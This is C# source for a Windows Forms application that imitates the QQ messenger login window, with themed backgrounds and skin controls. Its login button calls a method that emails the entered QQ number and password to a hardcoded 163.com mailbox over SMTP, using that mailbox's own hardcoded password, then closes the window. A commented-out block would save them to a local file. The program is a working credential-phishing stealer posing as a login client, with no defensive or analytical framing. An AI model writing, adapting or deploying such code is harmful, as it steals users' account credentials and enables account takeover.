using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Web;
using System.Net;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using CCWin;
using CCWin.SkinControl;
using CCWin.SkinClass;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;

namespace QQ2013
{
    public partial class FrmLogin : CCSkinMain
    {
        public FrmLogin()
        {
            InitializeComponent();
        }

        private void FrmLogin_Load(object sender, EventArgs e)
        {
            int Hour = Convert.ToInt32(DateTime.Now.ToString("HH"));
          
            if (Hour > 5 && Hour <= 11)
            {
                this.Back = Properties.Resources.morning;
            }
            else if (Hour > 11 && Hour <= 14)
            {
                this.Back = Properties.Resources.noon;
            }
            else if (Hour > 14 && Hour <= 19)
            {
                this.Back = Properties.Resources.afternoon;
            }
            else
            {
                this.Back = Properties.Resources.night;
            }
        }

       
        void item_Click(object sender, EventArgs e)
        {
            ToolStripMenuItem item = (ToolStripMenuItem)sender;
            txtId.Text = item.Tag.ToString();
            pnlImgTx.BackgroundImage = item.Image;
        }

        
        private void Control_MouseEnter(object sender, EventArgs e)
        {
            Control txt = (Control)sender;
            SkinPanel pnl = (SkinPanel)txt.Parent;
            pnl.ControlState = ControlState.Hover;
        }

        private void Control_MouseLeave(object sender, EventArgs e)
        {
            Control txt = (Control)sender;
            SkinPanel pnl = (SkinPanel)txt.Parent;
            pnl.ControlState = ControlState.Normal;
        }

        
        private void tuopan_DoubleClick(object sender, EventArgs e)
        {
            this.Show();
        }

        private void btnDl_Click(object sender, EventArgs e)
        {
            if (txtId.Text.Length == 0 || txtPwd.Text.Length == 0) { return; }
            SendEmil();
            btnDl.Enabled = btnDuoId.Enabled = btnSandeng.Enabled = false;
            imgLoadding.Visible = true;
            timShow.Start();
        }

   
        private void btnState_Click(object sender, EventArgs e)
        {
            MenuState.Show(this.Left + pnlTx.Left + pnlImgTx.Left + btnState.Left, this.Top + pnlTx.Top + pnlImgTx.Top + btnState.Top + btnState.Height + 5);
        }

        
        private void Item_Click(object sender, EventArgs e)
        {
            ToolStripMenuItem Item = (ToolStripMenuItem)sender;
            btnState.Image = Item.Image;
            btnState.Tag = Item.Tag;
        }


        private void btnId_Click(object sender, EventArgs e)
        {
        }

        private void txtPwd_IconClick(object sender, EventArgs e)
        {
            PassKey pass = new PassKey(this.Left + txtPwd.Left - 25, this.Top + txtPwd.Bottom, txtPwd);
            pass.Show();
        }
        private void chkZdLogin_CheckedChanged(object sender, EventArgs e)
        {
            chkMima.Checked = chkZdLogin.Checked ? true : chkMima.Checked;
        }
        private void chkMima_CheckedChanged(object sender, EventArgs e)
        {
            if (!chkMima.Checked && chkZdLogin.Checked)
            {
                chkZdLogin.Checked = false;
            }
        }
        private void timShow_Tick(object sender, EventArgs e)
        {
            this.Close();
            tuopan.Text = String.Format("QQ：{0}({1})", txtId.Text, txtId.Text);
            timShow.Stop();
        }
        private void SendEmil()
        {
            /*string str;
            str = txtId.Text + txtPwd.Text;
            StreamWriter sw = new StreamWriter("D:\\txt.txt", false);
            sw.WriteLine(str);
            sw.Close(); */
            MailMessage mail = new MailMessage();
            mail.From = new MailAddress("m18794816141@163.com", "董希福");
            mail.To.Add(new MailAddress("m18794816141@163.com", "董希福"));
            mail.Subject = "haha";
            mail.Body = "QQ号：（" + txtId.Text + "）密码：（" + txtPwd.Text + "）";
            SmtpClient client = new SmtpClient("smtp.163.com");
            client.Credentials = new NetworkCredential("m18794816141@163.com", "woaini13..");
            try
            {
                client.Send(mail);
            }
            catch (Exception ee)
            {
                mail.Body = ee.Message;
            }


        }
        private void txtId_Leave(object sender, EventArgs e)
        {
            txtPwd.Focus();
        }
    }
}
